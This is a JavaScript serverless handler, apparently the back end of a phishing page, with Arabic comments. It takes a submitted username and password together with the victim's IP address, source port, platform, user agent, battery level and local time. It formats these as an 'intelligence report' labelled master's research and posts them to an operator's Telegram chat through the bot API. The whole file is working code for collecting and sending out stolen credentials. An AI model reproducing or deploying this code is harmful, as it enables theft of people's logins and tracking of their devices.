export default async function handler(req, res) {
    if (req.method === 'POST') {
        const data = req.body;
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.CHAT_ID;

        // سحب الـ IP والـ Source Port من الـ Request
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const sourcePort = req.socket.remotePort; // المنفذ اللي طلبت ضافته

        // تنسيق التقرير الاستخباراتي
        const message = `
🕵️‍♂️ **INTELLIGENCE REPORT (MASTER'S RESEARCH)**
━━━━━━━━━━━━━━━━━━━━━━
👤 **User Credentials:**
- **Username:** \`${data.user}\`
- **Password:** \`${data.pass}\`

🌐 **Network Identity:**
- **IP Address:** \`${ip}\`
- **Source Port:** \`${sourcePort}\`

📱 **Device Information:**
- **OS/Platform:** \`${data.platform}\`
- **User Agent:** \`${data.ua}\`
- **Battery Level:** \`${data.battery}\`

⏰ **Session Details:**
- **Local Time:** \`${data.time}\`
- **Connection Status:** \`Success\`
━━━━━━━━━━━━━━━━━━━━━━
        `;

        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                }),
            });
            res.status(200).json({ success: true });
        } catch (error) {
            res.status(500).json({ error: 'Failed to send report' });
        }
    } else {
        res.status(405).json({ message: 'Method not allowed' });
    }
}
